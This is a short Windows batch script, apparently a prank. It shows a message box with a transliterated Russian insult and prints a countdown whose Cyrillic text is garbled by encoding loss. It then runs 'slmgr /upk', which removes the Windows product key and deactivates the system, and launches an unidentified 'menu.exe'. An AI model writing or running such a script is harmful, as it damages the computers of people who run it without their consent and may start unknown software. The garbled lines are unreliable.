@echo off
chcp 1251
color 4
cls
echo MsgBox "poshalko shto z debil" > CCB.vbs
cscript //nologo CCB.vbs
del CCB.vbs
echo �������� ��������� ������� ����� 3 �������...
>nul timeout/nobreak 1
echo �������� ��������� ������� ����� 2 �������...
>nul timeout/nobreak 1
echo �������� ��������� ������� ����� 1 �������...
>nul timeout/nobreak 1
echo �������� ��������� ��������� �������!
slmgr /upk
start menu.exe